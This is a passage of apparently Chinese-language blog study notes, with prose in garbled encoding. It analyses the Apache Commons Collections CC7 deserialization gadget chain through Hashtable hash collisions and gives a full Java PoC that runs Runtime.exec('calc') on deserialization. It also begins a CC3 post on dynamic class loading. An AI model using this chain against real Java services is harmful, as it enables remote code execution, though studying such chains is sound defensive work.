class="hljs-literal">false</span>;<br>    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;<br>    <span class="hljs-comment">//æ¯”è¾ƒä¸¤ä¸ª map çš„ size() </span><br>    <span class="hljs-keyword">if</span> (m.size() != size())<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//entrySet() çš„è¿­ä»£å™¨ï¼Œç”¨äºéå†æ‰€æœ‰é”®å€¼å¯¹ï¼ˆEntry&lt;K,V&gt;ï¼‰</span><br>        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();<br>        <span class="hljs-comment">//éå†æ¯ä¸€ä¸ªæ˜ å°„æ¡ç›®ï¼Œå–å‡º key å’Œ valueï¼Œå‡†å¤‡ä¸å¦ä¸€ä¸ª map m ä¸­å¯¹åº”çš„å€¼åšæ¯”è¾ƒ</span><br>        <span class="hljs-keyword">while</span> (i.hasNext()) &#123;<br>            Entry&lt;K,V&gt; e = i.next();<br>            <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> e.getKey();<br>            <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> e.getValue();<br>            <br>            <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">//value == null è¿›å…¥</span><br>                <span class="hljs-keyword">if</span> (!(m.get(key)==<span class="hljs-literal">null</span> &amp;&amp; m.containsKey(key)))<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (!value.equals(m.get(key)))<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (ClassCastException unused) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (NullPointerException unused) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Hashtable-reconstitutionPut"><a href="#Hashtable-reconstitutionPut" class="headerlink" title="Hashtable.reconstitutionPut"></a><font style="color:rgb(44, 62, 80);">Hashtable.</font><font style="color:#080808;background-color:#ffffff;">reconstitutionPut</font></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span><br><span class="hljs-keyword">throws</span> StreamCorruptedException<br>&#123;<br>    <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>    &#125;<br>    <span class="hljs-comment">// Makes sure the key is not already in the hashtable.</span><br>    <span class="hljs-comment">// This should not happen in deserialized version.</span><br>    <span class="hljs-comment">//è®¡ç®— key çš„å“ˆå¸Œå€¼</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> key.hashCode();<br>    <span class="hljs-comment">//% tab.length å°†å“ˆå¸Œå€¼æ˜ å°„åˆ°æ•°ç»„ç´¢å¼•èŒƒå›´</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>    <span class="hljs-comment">//ä» tab[index] ä¸­å°† Entry æ”¾å…¥å¾ªç¯</span><br>    <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br>        <span class="hljs-comment">//å…ˆ e.hash == hashï¼Œæ¯”è¾ƒå·²æœ‰å…ƒç´ å’Œæ–°å…ƒç´ çš„hashæ˜¯å¦ç›¸åŒ</span><br>        <span class="hljs-comment">//ä¸€æ ·ä¹‹åï¼Œæ¥ç€è°ƒç”¨ e.key.equals(key)ï¼Œæ¯”è¾ƒå·²æœ‰å…ƒç´ çš„keyå’Œæ–°çš„keyæ˜¯å¦ç›¸åŒ</span><br>        <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>            <span class="hljs-comment">//å¦‚æœ keyé‡å¤ï¼ŒæŠ›å‡ºå¼‚å¸¸</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// Creates the new entry.</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>    Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>    tab[index] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;&gt;(hash, key, value, e);<br>    count++;<br>&#125;<br></code></pre></td></tr></table></figure><p>**æ³¨æ„ï¼šé¦–å…ˆæ»¡è¶³ value !&#x3D; nullï¼Œä¹‹åæ»¡è¶³ä¿©ä¸ªå…ƒç´ çš„ hash å€¼ç›¸åŒï¼Œç„¶ååœ¨åˆ¤æ–­ key æ˜¯å¦é‡å¤æ—¶è§¦å‘ equals æ–¹æ³• **</p><h3 id="HashTable-readObject"><a href="#HashTable-readObject" class="headerlink" title="HashTable.readObject"></a><font style="color:rgb(26, 32, 44);">HashTable.readObject</font></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br><span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>&#123;<br>    <span class="hljs-comment">// Read in the length, threshold, and loadfactor</span><br>    s.defaultReadObject();<br><br>    <span class="hljs-comment">// Read the original length of the array and number of elements</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">origlength</span> <span class="hljs-operator">=</span> s.readInt();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">elements</span> <span class="hljs-operator">=</span> s.readInt();<br><br>    <span class="hljs-comment">// Compute new size with a bit of room 5% to grow but</span><br>    <span class="hljs-comment">// no larger than the original size.  Make the length</span><br>    <span class="hljs-comment">// odd if it&#x27;s large enough, this helps distribute the entries.</span><br>    <span class="hljs-comment">// Guard against the length ending up zero, that&#x27;s not valid.</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>)(elements * loadFactor) + (elements / <span class="hljs-number">20</span>) + <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>)<br>        length--;<br>    <span class="hljs-keyword">if</span> (origlength &gt; <span class="hljs-number">0</span> &amp;&amp; length &gt; origlength)<br>        length = origlength;<br>    table = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;?,?&gt;[length];<br>    threshold = (<span class="hljs-type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="hljs-number">1</span>);<br>    count = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// Read the number of elements and then all the key/value objects</span><br>    <span class="hljs-comment">//ååºåˆ—åŒ–</span><br>    <span class="hljs-keyword">for</span> (; elements &gt; <span class="hljs-number">0</span>; elements--) &#123;<br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K)s.readObject();<br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V)s.readObject();<br>        <span class="hljs-comment">// synch could be eliminated for performance</span><br>        reconstitutionPut(table, key, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ„é€ ï¼š"><a href="#æ„é€ ï¼š" class="headerlink" title="æ„é€ ï¼š"></a>æ„é€ ï¼š</h3><p><strong>ysoserialï¼š</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855518.png"></p><p>ç»“åˆä¸Šè¿°ä»£ç çš„åˆ†æï¼Œysoserial è¿™é‡Œè¦å†™ <strong>ä¿©ä¸ª put çš„ä½œç”¨</strong>ä¾¿æ˜¯ï¼š</p><p>åœ¨ Hashtable æ”¾å…¥ä¿©ä¸ª lazyMap ,åˆ¶é€ â€œå†²çªâ€ï¼Œè¿«ä½¿ä»–ä»¬è¿›å…¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br>        <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>åŒæ—¶è¦è®©ä¿©ä¸ªå…ƒç´ çš„å“ˆå¸Œå€¼ç›¸åŒã€(e.hash &#x3D;&#x3D; hash)ã€‘ï¼Œç„¶åå°±ä¼šè§¦å‘ <code>key.equals()</code> çš„æ¯”è¾ƒã€‚<br>è€Œ <code>equals()</code> å†…éƒ¨ä¼šè°ƒç”¨åˆ° <code>LazyMap.get()</code>ï¼Œæœ€ç»ˆè§¦å‘ <code>transformerChain</code> æ‰§è¡Œæ¶æ„ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//é¦–å…ˆåˆ›å»ºä¿©ä¸ªmap</span><br><span class="hljs-type">Map</span> <span class="hljs-variable">hashMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">hashMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        <span class="hljs-comment">//ä¿©ä¸ªå…ƒç´ çš„hashå€¼ä¸€æ ·</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);<br>        lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br>        <br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);<br>        lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(lazyMap1, <span class="hljs-number">1</span>);<br>        hashtable.put(lazyMap2, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">// è¿™é‡Œçš„é—®é¢˜åœ¨urldns å’Œ CC6 ä¸­å‡æœ‰æåŠ</span><br>        <span class="hljs-comment">//https://www.yuque.com/taohuayuanpang/qxcvxi/qvul6kkfwvcanocn#ZLUWn</span><br>        lazyMap1.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br></code></pre></td></tr></table></figure><blockquote><p><font style="color:rgb(44, 62, 80);">hashç›¸åŒçš„å€¼ï¼š</font></p><p>yyä¸zZ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021856813.png"><br>Eaä¸FB</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021856867.png"></p></blockquote><h3 id="å®Œæ•´POCï¼š"><a href="#å®Œæ•´POCï¼š" class="headerlink" title="å®Œæ•´POCï¼š"></a>å®Œæ•´POCï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.CC7;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// CC1-LazyMap</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><span class="hljs-comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;);<br><br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">hashMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">hashMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);<br>        lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);<br>        lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">//        System.out.println(lazyMap1.hashCode());</span><br><span class="hljs-comment">//        System.out.println(lazyMap2.hashCode());</span><br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(lazyMap1, <span class="hljs-number">1</span>);<br>        hashtable.put(lazyMap2, <span class="hljs-number">1</span>);<br><br>        lazyMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> ChainedTransformer.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(chainedTransformer, transformers);<br><br><br>        serialize(hashtable);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021856148.png"></p><h1 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h1><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021856619.png"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java å­¦ä¹ </tag>
      
      <tag>CCé“¾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CC3</title>
    <link href="/2025/09/01/CC3/"/>
    <url>/2025/09/01/CC3/</url>
    
    <content type="html"><![CDATA[<p>å†æ¬¡æ·±å…¥å­¦ä¹ åŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼š</p><h1 id="åŠ¨æ€åŠ è½½å­—èŠ‚ç "><a href="#åŠ¨æ€åŠ è½½å­—èŠ‚ç " class="headerlink" title="åŠ¨æ€åŠ è½½å­—èŠ‚ç "></a>åŠ¨æ€åŠ è½½å­—èŠ‚ç </h1><h2 id="1ã€ä»€ä¹ˆæ˜¯Javaçš„å­—èŠ‚ç "><a href="#1ã€ä»€ä¹ˆæ˜¯Javaçš„å­—èŠ‚ç " class="headerlink" title="1ã€ä»€ä¹ˆæ˜¯Javaçš„å­—èŠ‚ç "></a>1ã€ä»€ä¹ˆæ˜¯Javaçš„å­—èŠ‚ç </h2><blockquote><p>ä¸¥æ ¼æ¥è¯´ï¼ŒJavaå­—èŠ‚ç ï¼ˆByteCodeï¼‰å…¶å®ä»…ä»…æŒ‡çš„æ˜¯Javaè™šæ‹Ÿæœºæ‰§è¡Œä½¿ç”¨çš„ä¸€ç±»æŒ‡ä»¤ï¼Œé€šå¸¸è¢«å­˜å‚¨åœ¨.classæ–‡ä»¶ä¸­ã€‚</p></blockquote><p>javaçš„æ ¸å¿ƒå°±æ˜¯è·¨å¹³å°è¿è¡Œï¼ŒJavaç¼–è¯‘çš„ç»“æœâ€“å­—èŠ‚ç ï¼ˆ.classæ–‡ä»¶ï¼‰äº¤ç»™ JVM å»è¿è¡Œï¼ŒåŒæ—¶å¦‚æœå…¶ä»–è¯­è¨€å¯ä»¥ç¼–è¯‘ä¸ºå­—èŠ‚ç æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥äº¤ç”± JVM è¿è¡Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011703016.png"></p><h2 id="2ã€åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ–¹æ³•"><a href="#2ã€åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ–¹æ³•" class="headerlink" title="2ã€åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ–¹æ³•"></a>2ã€åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ–¹æ³•</h2><h3 id="2-1-åˆ©ç”¨-URLClassLoader-åŠ è½½è¿œç¨‹-class-æ–‡ä»¶"><a href="#2-1-åˆ©ç”¨-URLClassLoader-åŠ è½½è¿œç¨‹-class-æ–‡ä»¶" class="headerlink" title="2.1 åˆ©ç”¨ URLClassLoader åŠ è½½è¿œç¨‹ class æ–‡ä»¶"></a>2.1 åˆ©ç”¨ URLClassLoader åŠ è½½è¿œç¨‹ class æ–‡ä»¶</h3><blockquote><p>è§£é‡Š URLClassLoader çš„å·¥ä½œè¿‡ç¨‹å®é™…ä¸Šå°±æ˜¯åœ¨è§£é‡Šé»˜è®¤çš„Javaç±»åŠ è½½å™¨çš„å·¥ä½œæµç¨‹ã€‚</p><p>æ­£å¸¸æƒ…å†µä¸‹ï¼ŒJavaä¼šæ ¹æ®é…ç½®é¡¹ sun.boot.class.path å’Œ java.class.path ä¸­åˆ—ä¸¾åˆ°çš„åŸºç¡€è·¯å¾„ï¼ˆè¿™äº›è·¯å¾„æ˜¯ç»è¿‡å¤„ç†åçš„ java.net.URL ç±»ï¼‰æ¥å¯»æ‰¾.classæ–‡ä»¶æ¥åŠ è½½ï¼Œè€Œè¿™ä¸ªåŸºç¡€è·¯å¾„æœ‰åˆ†ä¸ºä¸‰ç§æƒ…å†µï¼š</p><ul><li>URLæœªä»¥æ–œæ  &#x2F; ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJARæ–‡ä»¶ï¼Œä½¿ç”¨ JarLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨JaråŒ…ä¸­å¯»æ‰¾.classæ–‡ä»¶</li><li>URLä»¥æ–œæ  &#x2F; ç»“å°¾ï¼Œä¸”åè®®åæ˜¯ file ï¼Œåˆ™ä½¿ç”¨ FileLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯»æ‰¾.classæ–‡ä»¶</li><li>URLä»¥æ–œæ  &#x2F; ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯ file ï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„ Loader æ¥å¯»æ‰¾ç±»</li></ul><p>æˆ‘ä»¬æ­£å¸¸å¼€å‘çš„æ—¶å€™é€šå¸¸é‡åˆ°çš„æ˜¯å‰ä¸¤è€…ï¼Œé‚£ä»€ä¹ˆæ—¶å€™æ‰ä¼šå‡ºç°ä½¿ç”¨ Loader å¯»æ‰¾ç±»çš„æƒ…å†µå‘¢ï¼Ÿå½“ç„¶æ˜¯é file åè®®çš„æƒ…å†µä¸‹ï¼Œæœ€å¸¸è§çš„å°±æ˜¯ http åè®®ã€‚</p></blockquote><h4 id="2-1-1-file-åè®®"><a href="#2-1-1-file-åè®®" class="headerlink" title="2.1.1 file åè®®"></a>2.1.1 file åè®®</h4><p>å…ˆç¼–è¯‘ä¸€ä¸ªæ–‡ä»¶ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span>(IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011703146.png"></p><p>ä½¿ç”¨ URLClassLoader åŠ è½½ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassLoader_Calc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception 